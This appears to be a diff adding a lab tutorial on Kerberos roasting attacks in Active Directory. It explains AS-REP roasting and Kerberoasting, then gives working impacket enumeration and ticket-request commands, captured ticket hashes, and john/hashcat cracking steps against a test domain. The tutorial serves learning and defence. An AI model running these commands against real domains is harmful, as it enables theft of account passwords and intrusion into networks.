@@ -1,0 +1,233 @@
+                    _______________________________
+
+                     ACTIVE DIRECTORY EXPLOITATION
+                      Roasting Attacks on Kerberos
+
+                                Hexdump
+                    _______________________________
+
+
+Table of Contents
+_________________
+
+1. Roasting Attacks
+2. AS-REP Roasting
+.. 1. Example
+3. Kerberoasting
+.. 1. Example
+4. References
+
+
+1 Roasting Attacks
+==================
+
+  In the context of Active Directory, `roasting attacks' on the
+  `Kerberos protocol' are based on the ability of an attacker to capture
+  tickets encrypted with users or services passwords.
+
+  Remember that during the kerberos authentication, various tickets are
+  encrypted with secrets derived from long term passwords.
+
+  ,----
+  | 2) AS-REP (KDC/AS -> Client)
+  |    - TGT 🔑 KDC key
+  |    - TGS Session Key 🔑 Client key
+  `----
+
+  ,----
+  | 5) AP-REQ (Client -> Service)
+  |    - ST 🔑 Service key
+  |    - Authenticator data 🔑 Service Session key 
+  `----
+
+
+2 AS-REP Roasting
+=================
+
+  `AS-REP Roasting' targets user accounts for which kerberos does not
+  enforce preauthentication.
+
+  Remember that to obtain a `TGT' the user had to sent to the server a
+  timestamp encrypted with a user key derived from the user long term
+  password. This encrypted timestamp is sent only for preauthentication.
+
+  If preauthentication for a user is disabled, then there is no need to
+  sent the encrypted timestamp. Thus an attacker is able to obtain a
+  `TGT' encrypted with the key of the victim user.
+
+  ,----
+  | 1) AS-REQ (Client -> KDC/AS)
+  |    - Timestamp 🔑 Client key
+  | 
+  | 2) AS-REP (KDC/AS -> Client)
+  |    - TGT 🔑 KDC key
+  |    - TGS Session Key 🔑 Client key
+  `----
+
+  Once the attacker obtains the `AS-REP', it then becomes possible to
+  `crack the client password'. If the crack attempt is succesful, the
+  attacker is able to obtain the password of the victim user.
+
+  Let's see a pratical example.
+
+
+2.1 Example
+~~~~~~~~~~~
+
+  Create user named `asrep'
+  ,----
+  | New-ADUser -Name "asrep" -SamAccountName "asrep" -UserPrincipalName "asrep@hexdump.lab" -ACcountPassword (ConvertTo-SecureString -AsPlainText "Hexdump123!" -Force) -Enabled $true
+  `----
+
+  Confirm user creation of `asrep'
+  ,----
+  | Get-ADUser -Identity asrep
+  `----
+
+  ,----
+  | DistinguishedName : CN=asrep,CN=Users,DC=hexdump,DC=lab
+  | Enabled           : True
+  | GivenName         :
+  | Name              : asrep
+  | ObjectClass       : user
+  | ObjectGUID        : 7d013a3b-f038-40be-9fa4-467502333452
+  | SamAccountName    : asrep
+  | SID               : S-1-5-21-2273708531-2432934561-2696658194-1107
+  | Surname           :
+  | UserPrincipalName : asrep@hexdump.lab
+  `----
+
+  Disable "Do not require Kerberos preauthentication"
+  ,----
+  | Win + R
+  | dsa.msc
+  | User -> Properties
+  |      -> Account Options
+  |      -> Do not require Kerberos preauthentication
+  `----
+
+  Check option
+  ,----
+  | Get-ADUser -Identity "asrep" -Properties DoesNotRequirePreAuth | Select-Object Name, DoesNotRequirePreAuth
+  `----
+
+  ----------------------------------------------------------------------
+
+  ,----
+  | python3 -m venv venv
+  | . venv/bin/activate
+  | pip3 install impacket
+  `----
+
+  Perform `AS-REP' roasting using `impacket'
+  ,----
+  | GetNPUsers.py hexdump.lab/asrep -dc-ip 192.168.122.30 -no-pass
+  `----
+
+  Obtain the data
+  ,----
+  | $krb5asrep$23$asrep@HEXDUMP.LAB:f2efdeb8d5d8980e66f1e7f4c6f34b8b$6e8d6576d7489ea2487f64963c1388a0652c4b12f58d5537980c3b85a210f98d72ab40a800d0eb63fa66c9df5a5dc63884d83c4269b34253bf840c727ab42b0f3d1cb6866febbe664507bea579b3e92c53a273229d5888763f7c75e0b75bbfc3c7724ec540dcd826d412dd27242eddc08a4eaed50c7ff49a4f8e7b48b8cd48560b0d6d084d7d967d431a6b34580da1a7e1e04bc9ffea03c11efdf666b936c23486880c17411d508c74cdd8f48b6f3ceee59d4145a6e2d60707f6bb91c418ee82ebd663f6db1adfd7a8b45bb6db76d693e2c3222af103081612f0f44e3b1de8af50178845a8f7dc176174
+  `----
+
+  Crack the ticket
+  ,----
+  | john --wordlist=./passwords.txt ./as-rep.txt
+  | hashcat -m 18200 ./as-rep ./passwords.txt
+  `----
+
+
+3 Kerberoasting
+===============
+
+  `Kerberoasting' targets accounts that have a registered Service
+  Principal Name (SPN). That is, services that are registered with
+  Kerberos.
+
+  During Kerberos authentication, after the `TGT' has been obtained, you
+  can ask for a `ST'. The Service Ticket is encrypted with a secret
+  derived from the service account long term password.
+
+  ,----
+  | 3) TGS-REQ (Client -> KDC/TGS)
+  |    - TGT 🔑 KDC key
+  |    - Authenticator data 🔑 TGS Session Key
+  | 
+  | 4) TGS-REP (KDC/TGS -> Client)
+  |    - ST 🔑 Service key
+  |    - Service Session key 🔑 TGS Session Key
+  `----
+
+  Once the attacker obtains the `ST', it is then possible to `crack
+    it'. If the crack attempt is succesful, the attacker is able to
+    obtain the password of the service account.
+
+  Notice that for this attack to work it is needed to know the
+  credentials of a user account that can be authenticated with Kerberos.
+
+  Let's see a pratical example.
+
+
+3.1 Example
+~~~~~~~~~~~
+
+  Create new user
+  ,----
+  | New-ADUser -Name "kerberoasting" -SamAccountName "kerberoasting" -UserPrincipalName "kerberoasting@hexdump.lab" -ACcountPassword (ConvertTo-SecureString -AsPlainText "Hexdump123!" -Force) -Enabled $true
+  `----
+
+  Assign to the user a SPN
+  ,----
+  | Set-ADUser -Identity "kerberoasting" -ServicePrincipalNames @{Add="HTTP/kerberoasting.hexdump.lab"}
+  `----
+
+  Verify the SPN
+  ,----
+  | Get-ADUser -Identity "kerberoasting" -Properties ServicePrincipalNames
+  | setspn -L kerberoasting
+  `----
+
+  ----------------------------------------------------------------------
+
+  List out SPNs that can be kerberoasted
+  ,----
+  | GetUserSPNs.py hexdump.lab/leo:"Hexdump123!" -dc-ip 192.168.122.30
+  `----
+
+  Perform the attack on a specific username
+  ,----
+  | GetUserSPNs.py hexdump.lab/leo:"Hexdump123!" -dc-ip 192.168.122.30 -request-user kerberoasting
+  `----
+
+  Perform the attack on all registered users
+  ,----
+  | GetUserSPNs.py hexdump.lab/leo:"Hexdump123!" -dc-ip 192.168.122.30 -request
+  `----
+
+  If these commands fail due to `KRB_AP_ERR_SKEW(Clock skew too great)'
+  error, you need to syncronize clocks using `ntpdate'
+  ,----
+  | sudo timedatectl set-ntp off
+  | ntpdate -q 192.168.122.30
+  | ntpdate -u 192.168.122.30
+  `----
+
+  Example of an ST (Service Ticket)
+  ,----
+  | $krb5tgs$23$*leo$HEXDUMP.LAB$hexdump.lab/leo*$6ab90b424c83a83b69a5c67ca1341a0b$ba4e367a05aa3a3864f804aa0088c3610cbf28d6fbf2caaf2d356ada4cbf00871c0b6e3e886fda78f397a5e100ff918af9bdeb1910c0cf53554225564788d40236d01d0ec6f22afd0673fa59edb1e57c77f993735c528a533ae98f7c8d837645f71d69e51633f2a16eaf922a55631bcd7c650a49aa0008a0c0a666b4c58c7c7f4f965fdf6a45c208bae944df3bffe8e956a2c46f7981e5eae8e6c68aa83d1633bac215865c31e3c450e153fd8340d1df5aad1bf23a2272c9e7704a88eedc5955f290fa74a86e7344148ce030eb2bdc88f1c7c9fd02bd83ead3b9243ba7edd3d1fc2b384379b8c5ca85b34f8095198b4350d87a5ec7ada6a1629b5443b725038e44af44c133accf6bda4ceda2b31a876cc3752d6a704ebe39d60ec9dc116f9708b3cdea44cebd4725751e334b3154057ea8915525d30c4d948e2e014fa016f35d94327f4a52825f8366f75a5285bc45bc0907bbafdc6f4c6c696dcf7dd2d661941418bf907fa67a1bc5a5643ff2aa566fdc0e07f528c1a99f7b076ba8492f9025a202efd2b556a560dd11bd78f0fce2eb99ffd50b2ea2300c15ef554cb0a981a8e23a5a47c35fb0f1c7dcd8b61c8d92a76f87dfdc42a567461881482d001224f3f55d7917042b5778c7098c333e986c19cb2a09c77fb92bbd336aa694b850d3097484586b2778b18618489f8613bcc56a8b4cfd7bc3e426dd434f4252c7e4a60634c4df3e9d95bcdb6561062dcb1de282cea0d159ea029b3d6f1614aca30a02b8e8ae25df5c83d6ef5a64393237c20801cfa10145984cb2fcb0525898d1fea0288560f0c92473dd987268aa70b1a2a31a3bfe624aaedc62ed2d5e6e465929b6ba86835db75b3483db31de6e6a00d0fed33b9163de27b63595b28e13ad9f2164b8b07bb422e71bf1981c23be04e046b92ab47b1e397ae9ab394db13c3c976e516876899ffda35855dd11116e86f25d2bc122724904fa75f6ebc5a7abcc290e7752ec5a71c2d3c060a79bbc346ef76f346b5598e3f2238ee0403fc22697395697385f558ad41bd6c6f9c9e938ac43734624393a193990fc07f4069cc6871fe31c195c5119704b3d22ee9a3c83bbc11720b80256f16c2de460144a007230b8308c3ee589214f36c4ac9d58e79af02603a2bf714991ed4565be9ca403320ac4e3ddc909f9317fad6f479fd7faaddc831e7cc9b660ef8559f2becccff8a99d58951ec3f8c2f5a541e07cdac85030f6e7f66eae8d1c75a92de4eed950ea30d799e55f8621e86bd959142159620cdd103ed7d38359e65483b78b951f5c389bebf1138cf758cff2693d99aeece28b9a4eba042e7076d6cd049de68751894d051c4c8bed1d8223b74b629040c3de325b5796d993d596c574e1c4d7688556cba1661f3088826ddba5d98b89a88f7293e8bc5a666dd0a7e08fe1236d787181928e57d18d3ed3982b0ff273c78f630b676ce2f354adf039dc80428b0c5fb108b4be7056b9051237
+  | 
+  `----
+
+  Crack the ST and obtain the account password
+  ,----
+  | john --format=krb5tgs --wordlist=passwords.txt st.txt
+  | hashcat -m 13100 ./st.txt ./passwords.txt
+  `----
+
+
+4 References
+============
+
+  Understanding the Kerberos Protocol <https://youtu.be/dQz3CMlVYNY>
+
+  The Kerberos Network Authentication Service
+  <https://datatracker.ietf.org/doc/html/rfc4120>
